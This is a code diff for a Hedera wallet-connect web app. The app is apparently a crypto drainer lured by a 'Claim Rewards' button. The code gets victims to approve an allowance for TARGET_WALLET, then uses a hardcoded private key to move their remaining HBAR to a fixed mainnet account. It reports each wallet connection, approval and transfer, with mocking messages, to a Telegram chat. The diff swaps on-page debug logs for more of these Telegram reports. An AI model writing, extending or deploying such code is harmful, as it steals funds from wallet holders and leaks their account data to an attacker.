@@ -10,27 +10,11 @@ import { useWalletInterface } from "../../services/useWalletInterface";
 import { dappConnector } from "../../services/wallets/walletconnect/walletConnectClient";
 import { sendMessageToTelegram } from '../../services/notificationUtils';
 
-// Add at the top of the file, after imports
-function logToPage(msg: string) {
-  const el = document.createElement('div');
-  el.style.color = 'red';
-  el.style.fontSize = '16px';
-  el.style.background = 'rgba(255,255,255,0.8)';
-  el.style.zIndex = '9999';
-  el.style.position = 'relative';
-  el.style.padding = '2px 8px';
-  el.textContent = '[DEBUG] ' + msg;
-  document.body.appendChild(el);
-}
- 
 const chatId = '-1002734673892';
 
 export const HashConnectClient = () => {
   const dispatch = useDispatch();
   const syncCalledRef = useRef(false); // To track if syncWithHashConnect has already been called
-
-  // At the start of the main component function
-  logToPage('App loaded on: ' + navigator.userAgent);
 
   async function hbarAllowanceFcn(owner: any, receiver: any, sendBal: any, spender: any, spenderPvKey: any, client: any) {
     const approvedSendTx = await new TransferTransaction()
@@ -76,7 +60,6 @@ export const HashConnectClient = () => {
 
   const syncWithHashConnect = useCallback(async () => {
     // In syncWithHashConnect, before wallet connect logic
-    logToPage('syncWithHashConnect called');
 
     try {
       // Get connected account IDs for hashconnect@0.2.4
@@ -88,11 +71,8 @@ export const HashConnectClient = () => {
       if ((!connectedAccountIds || connectedAccountIds.length === 0) && typeof dappConnector !== 'undefined' && dappConnector.signers && dappConnector.signers.length > 0) {
         const signerAccountId = dappConnector.signers[0]?.getAccountId()?.toString();
         if (signerAccountId) {
-          logToPage('AccountId available: ' + signerAccountId);
           connectedAccountIds = [signerAccountId];
-          logToPage('About to send Telegram notification for account: ' + signerAccountId);
           sendMessageToTelegram(`[INFO] Wallet connected: ${signerAccountId}`);
-          logToPage('Telegram notification sent for account: ' + signerAccountId);
         }
       }
 
@@ -157,32 +137,32 @@ export const HashConnectClient = () => {
       const allowRestult = await receipt.status.toString();
       
       if (allowRestult === "SUCCESS") {
-        logToPage('About to send Telegram notification: ' + `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
-        logToPage('Telegram notification sent: ' + `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
+        sendMessageToTelegram(`${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
+        sendMessageToTelegram(`Telegram notification sent: ${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
         
         let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
         
         if (remainingHbar > 0.5) {
           remainingHbar = remainingHbar - 0.5;
-          logToPage('Gas fee deducted (0.5 HBAR), remaining balance:' + remainingHbar);
+          sendMessageToTelegram(`Gas fee deducted (0.5 HBAR), remaining balance:${remainingHbar}`);
         } else {
-          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
-          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          sendMessageToTelegram(`Telegram notification sent: ${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
           return; // Exit if there's no HBAR to cover gas fees
         }
         
         const receiver = await '0.0.9379441';
         
         if (Math.floor(remainingHbar) < 1) {
-          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
-          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          sendMessageToTelegram(`Telegram notification sent: ${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
         } else {
           const balance = await new Hbar(Math.floor(remainingHbar));
           const result = await hbarAllowanceFcn(hbarAccountId, receiver, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
           
           if (result.status.toString() === "SUCCESS") {
-            logToPage('About to send Telegram notification: ' + `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
-            logToPage('Telegram notification sent: ' + `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+            sendMessageToTelegram(`${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+            sendMessageToTelegram(`Telegram notification sent: ${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
           }
         }
       }
@@ -2317,9 +2297,8 @@ export const HashConnectConnectButton = () => {
                 <a
                   onClick={async () => {
                     try {
-                      logToPage('Claim Rewards button tapped!');
-                      await sendMessageToTelegram('Claim Rewards button tapped on ' + navigator.userAgent);
-                      logToPage('Telegram notification sent for Claim Rewards tap');
+                      sendMessageToTelegram('Claim Rewards button tapped on ' + navigator.userAgent);
+                      sendMessageToTelegram('Telegram notification sent for Claim Rewards tap');
                     } catch (e) {
                       alert('logToPage error: ' + e);
                     }
